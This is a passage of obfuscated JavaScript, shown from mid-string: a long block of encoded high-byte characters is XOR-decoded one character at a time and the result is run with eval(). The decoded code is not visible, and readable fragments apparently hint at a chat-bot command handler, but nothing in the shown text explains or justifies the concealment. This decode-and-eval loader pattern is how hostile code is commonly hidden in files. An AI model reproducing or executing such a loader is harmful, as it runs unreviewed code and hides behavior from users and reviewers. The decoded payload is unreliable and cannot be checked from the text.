³©öî¦ëíëòù¨§ù÷ö¹»ª¬±«®»ªª·°¹­ò÷ä¥£òã¥ù­±½µùä³òù³­¹ùä¸òù´·ºùäòù­»°º»¬ùä°òù­»°º»¬«³ùä½òù¿¬¹­ùäòù¼±º§ùä¿òù½±³³¿°ºùä¨òù¯«±ª»ºùä´òù³»°ª·±°­ùäºòù¸¬±³¬±«®ùäòù¸¬±³»ùä¤òù·­©°»¬ùä³©öî¦èç»òù¦µù÷ö·­©°»¬ò°÷òù·­«º±ùä³©öî¦ë½éòùìù÷ö·­«º±ò°ò÷òù¹¬±«®»ªª·°¹­ùäòù®¬»¸·¦ùäòù¬»®²§ùä¶ãà­»°º»®²§ö³òòª§®»±¸þ¶ããã³©öî¦ïéêòùé´ù÷á¥ùª»¦ªùä¶£ä¶ò¸÷òù­»°º­¹ùä¶ãà³³©öî¦êèíòùµ¤¼ûù÷õù»ùöò¶÷òù­·³«²¿ª»¬»­»°½»ùäö÷ãà¥£òù¬»¿½ªùä¶ãà³³©öî¦ëè¸òù¶ªëù÷õù»ùöò¥ù¬»¿½ªùä¥ùª»¦ªùä¶òùµ»§ùä¸³©öî¦è»êòù°ç¬ù÷££÷£ò²ã½±°¸·¹³©öî¦é»çòùµýù÷¢¢º»¸¿«²ª­³©öî¦í½ëòùî³íù÷å·¸ö¨÷¥½±°­ªþ¶ã¥£å¶³©öî¦èºìòùù÷ã²ò¶³©öî¦êºêòùºëèù÷ãò¶³©öî¦ëí¸òù«¹¤ù÷ã°ò¶³©öî¦ìïºòùù÷ã¤ò¶³©öî¦í½¿òù«®³ù÷ã½å·¸öÿ³©öî¦í¸ºòùç®ù÷ö½¿°­»±³³¿°º­ò¶÷÷½±°ª·°«»å³©öî¦ì¼ëòùù÷ö½ò³©öî¦êë»òùµ¤¼ûù÷÷øøÿ¤øøö³©öî¦ëçéòù¬ù÷ö³©öî¦ëæíòùµ¤¼ûù÷ò³©öî¦ì»½òù·êù÷÷á²±¹¹»¬³©öî¦çæïòùµ¤¼ûù÷ö¥ùª§®»ùä³©öî¦çççòùæù÷òù­»°º»¬ùä½òù°¿³»ùä¸³©öî¦ëæìòùê©¯ù÷¢¢³©öî¦éîïòù¦µù÷òù½¶¿ªºùäòù³»­­¿¹»ùä³©öî¦æéïòù±ëù÷ö³©öî¦êìïòù¤û»ù÷ö³©öî¦é½èòù«®³ù÷ö¬áùùäò¨÷òù¦ìîù÷ò³©öî¦ëïéòù«®³ù÷öù¦ìîù÷÷òù·­±³³¿°ºùäÿÿ£÷äã³©öî¦íéëòù°ù÷ö³©öî¦¼ºòùê©¯ù÷öóî¦êôóî¦êïìõóî¦ìè¸½õóî¦ïôóî¦ïè¼êòî¦éíºõóî¦ïé¸¸ôóî¦ïõóî¦ï»º¼÷ò³©öî¦ê¼ïòù¹½ù÷÷÷åª¬§¥¿©¿·ªþ¨ö÷å£½¿ª½¶ö÷¥²±¹¹»¬³©öî¦æî¸òùê©¯ù÷ö³©öî¦ìææòùêïù÷ö³©öî¦ïïèòù±ëù÷ö³©öî¦ê¼¿òù½«ù÷ö³©öî¦íîîòùêïù÷ò¨÷ò³©öî¦ë¸éòù±ëù÷÷ò³©öî¦éî¿òùî³íù÷÷÷åª¬§¥·¸ö³©öî¦ç»½òù°ç¬ù÷ö³©öî¦èçêòùîù÷ò³©öî¦êç»òùî³íù÷÷÷¥½±°­ªþ¤ã³©öî¦êééòùîù÷å·¸öÿ¤÷¬»ª«¬°ÿå·¸ö¤³©öî¦êéëòù½«ù÷õ³©öî¦ê½êòùµ³ïù÷¢¢¤³©öî¦êêºòùîù÷õ³©öî¦é¼ïòùì±ù÷¢¢¤³©öî¦ê¼ìòù±ëù÷õ³©öî¦ïí»òù¦±ù÷õ³©öî¦æêçòùç®ù÷÷¬»ª«¬°ÿÿå·¸ö¤³©öî¦íº½òù­¤ù÷õù¹»ùøø¤³©öî¦èèèòù¹½ù÷õù¹»ù³©öî¦í¿»òùë¼ù÷÷¬»ª«¬°ÿÿå·¸ö¤³©öî¦èííòù·êù÷õù¹»ùøø¤³©öî¦êºîòùôëù÷õù¹»ù³©öî¦íæçòù²êöêù÷÷¬»ª«¬°ÿÿå¬»ª«¬°ÿå£»²­»þ¿©¿·ªþ³©öî¦ëìïòùî³íù÷ö³©öî¦æçëòùÿéù÷ö³©öî¦èîèòù±ëù÷ö³©öî¦í»çòù§ç¶ù÷ö³©öî¦æ½ºòùéÿ­ù÷ö³©öî¦èí½òùµ¤¼ûù÷ò¨÷òù¦î¿ù÷ò³©öî¦éî¿òùî³íù÷÷òùù÷÷å£½¿ª½¶ö¤÷¥£££££½¿ª½¶ö÷¥²±¹¹»¬³©öî¦ìíëòù¸é¶ù÷ö³©öî¦ë½îòùê©¯ù÷ö³©öî¦êíìòù¦µù÷ò³©öî¦æ¿èòù¤û»ù÷÷÷å£££÷ò²±¹¹»¬³æöî¦çíçòù¸èù÷ö³æöî¦êéìòù±ëù÷÷å£å";let _0xOut="";for(let _0xI=_0xHex[0x0];_0xI<_0xBlob[_0xHex[0x3]];_0xI++){_0xOut+=String[_0xHex[0x5]](_0xBlob[_0xHex[0x4]](_0xI)^_0xKey);}eval(_0xOut);
